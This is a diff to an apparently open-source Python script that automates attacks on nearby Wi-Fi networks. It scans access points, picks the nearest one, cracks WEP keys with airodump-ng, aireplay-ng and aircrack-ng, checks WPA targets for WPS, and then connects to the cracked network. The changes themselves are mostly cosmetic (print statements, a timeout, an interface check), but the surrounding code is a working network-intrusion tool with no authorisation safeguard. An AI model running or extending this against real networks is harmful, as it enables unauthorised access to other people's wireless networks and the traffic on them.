@@ -165,15 +165,16 @@ def WPS_check(bssid,iface_mon):
     return WPS
 
 def WEP_attack(essid,bssid,channel,new_mac,iface_mon):
-    #Delete old files:
+    # Delete old files
     if os.path.exists(OS_PATH+'/cr0z0n0_attack-01.csv'):
         os.remove(OS_PATH+'/cr0z0n0_attack-01.csv')
         os.remove(OS_PATH+'/cr0z0n0_attack-01.cap')
         os.remove(OS_PATH+'/cr0z0n0_attack-01.kismet.csv')
         os.remove(OS_PATH+'/cr0z0n0_attack-01.kismet.netxml')
-
+    print("  [+] Collecting traffic...")
     proc_airodump = Popen(['airodump-ng', '--bssid', bssid, '-c', channel, '-w', 'cr0z0n0_attack', iface_mon], stdout=DN, stderr=DN)
 
+    print("  [+] Replay...")
     cmd_auth = pexpect.spawn('aireplay-ng -1 0 -e "{0}" -a {1} -h {2} {3}'.format(essid,bssid,new_mac,iface_mon))
     cmd_auth.logfile = file(LOG_FILE,'w')
     cmd_auth.expect(['Association successful',pexpect.TIMEOUT,pexpect.EOF],25)
@@ -189,9 +190,10 @@ def WEP_attack(essid,bssid,channel,new_mac,iface_mon):
 
     time.sleep(300) #change time
 
+    print("  [+] Cracking...")
     cmd_crack = pexpect.spawn('aircrack-ng cr0z0n0_attack-01.cap')
     cmd_crack.logfile = file(LOG_FILE,'w')
-    cmd_crack.expect(['KEY FOUND!','Failed', pexpect.TIMEOUT,pexpect.EOF],30)
+    cmd_crack.expect(['KEY FOUND!','Failed', pexpect.TIMEOUT,pexpect.EOF], 30)
     cmd_crack.close()
     key_found = False
     parse_log_crack = open(LOG_FILE,'r')
@@ -221,7 +223,7 @@ def scan_targets(iface_mon,essid_predefined):
         os.remove(OS_PATH+'/cr0z0n0-01.kismet.csv')
         os.remove(OS_PATH+'/cr0z0n0-01.kismet.netxml')
     cmd_airodump = pexpect.spawn('airodump-ng -w cr0z0n0 {0}'.format(iface_mon))
-    time.sleep(15)
+    time.sleep(20)
     cmd_airodump.close()
 
     print open(OS_PATH+'/cr0z0n0-01.csv', 'r').read()
@@ -242,7 +244,7 @@ def scan_targets(iface_mon,essid_predefined):
         csv.close()
         APs_list = sorted(APs_list, key = lambda x: x[5]) #APs sorted by the nearest
         if not APs_list:
-            print "  [x] No WiFi access points in range!"
+            print("  [x] No WiFi access points in range!")
             exit()
 
         APs_nearest = []
@@ -324,6 +326,10 @@ def get_iface():
             interfaces.remove(iface)
 
     # Return the last interface available
+    if not interfaces:
+        print("  [x] No interfaces available!")
+        exit()
+
     return interfaces.pop()
 
 
@@ -390,11 +396,10 @@ def main():
         target_channel = ap_target[1].strip()
         target_privacy = ap_target[2].strip()
 
-        print("  [+] Target selected: "+ target_essid)
+        print("  [+] Target selected: {} ({}) ".format(target_essid, target_privacy))
 
         if target_privacy == 'WEP':
-            print("  [+] Cracking "+target_essid+" access point with WEP privacy...")
-            key = WEP_attack(target_essid,target_bssid,target_channel,new_mac,iface_mon)
+            key = WEP_attack(target_essid, target_bssid, target_channel, new_mac, iface_mon)
             if key == False:
                 print("  [-] Key not found! :(")
                 exit()
@@ -404,7 +409,7 @@ def main():
                 ip_lan = connect(target_essid,key,iface_mon)
 
         elif target_privacy == 'WPA' or target_privacy == 'WPA2' or target_privacy == 'WPA2 WPA':
-            print("  [+] Cracking "+target_essid+" access point with "+target_privacy+" privacy...")
+            print("  [+] Cracking "+target_essid+" access point with "+target_privacy+"...")
             WPS = WPS_check(target_bssid,iface_mon)
 
             if WPS == True:
